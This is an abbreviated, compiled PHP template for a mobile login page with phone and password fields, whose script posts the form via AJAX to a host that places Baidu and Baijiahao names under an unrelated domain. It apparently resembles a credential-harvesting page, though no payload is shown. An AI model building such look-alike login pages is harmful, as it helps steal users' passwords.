<?php if (!defined('THINK_PATH')) exit(); /*a:2:{s:58:"/web/bt/public/../application/index/view/user/looginx.html";i:1562669692;s:50:"/web/bt/application/index/view/layout/default.html";i:1561535542;}*/ ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
...
<html>
	...
	<body>
		<div class="content">
			<div class="login">
				<img class="tts" src="<?php echo $site['site_url']; ?>/game/xxx/img/title_l.png">
				<div class="form">
					<input class="input phone" type="number" pattern="[0-9]*" maxlength="11" placeholder="请输入手机号" />
					<input class="input password" type="password" maxlength="11" placeholder="请输入密码" />
				</div>
		...
		<script type="text/javascript">
			mui(".content").on('tap', '.btn', function(e) {
				...
				$.ajax({
					type: 'POST',
					url: 'http://baidu.baijiahao.tke3l.cn/index.php/index/user/loginxxx',
